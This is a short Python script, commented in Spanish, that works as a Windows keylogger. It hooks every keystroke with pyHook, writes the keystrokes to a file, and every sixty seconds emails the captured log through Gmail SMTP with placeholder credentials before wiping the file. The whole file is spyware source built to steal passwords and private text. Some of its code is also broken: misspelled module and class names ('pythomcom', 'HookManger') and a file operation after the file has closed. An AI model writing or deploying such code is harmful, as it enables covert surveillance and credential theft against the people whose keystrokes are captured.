import pyHook, pythomcom, sys, logging #necesitas usar Windows para usar el modulo pyHook
import time, datetime

wait_seconds = 60
timeout = time.time() + wait_seconds
file_log ='/Desktop/archivo.txt'


def TimeOut():
    if time.time() > timeout:
        return True
    else:
        return False


def SendEmail(user, pwd, recipient, subject, body):
    import smtplib

    gmail = user
    gmail_passpwd = pwd
    FROM = user
    TO = recipient if type(recipient) is list else [recipient]
    SUBJECT = subject
    TEXT = body

    message = """\From: %s\nTo: %s\nSubject: %s\n\n%s
    """ % (FROM, ", ".join(TO), SUBJECT, TEXT)

    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(gmail, gmail_passpwd)
        server.sendmail(FROM, TO, message)
        server.close()
        print ("Correo enviado satisfactoriamente!")
    except:
        print ("Error al mandar correo!")


def FormatAndSendLogEmail():
    with open(file_log, 'r+') as f:
        actualdate = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data = f.read().replace('\n', '')
        data = 'Log capturado a las: '+ actualdate + '\n' + data
        SendEmail('tucorreo@gmail.com', 'tupass', 'tucorreo@gmail.com','Nuevo log - '+actualdate, data)
    f.seek(0)
    f.truncate()


def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log,level=logging.DEBUG,format='%(message)s')
    logging.log(10,chr(event.Ascii))
    return True


hooks_manager = pyHook.HookManger()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()


while True:
    if TimeOut():
        FormatAndSendLogEmail()
        timeout = time.time() + wait_seconds

    pythomcom.PumpWaitingMessages()
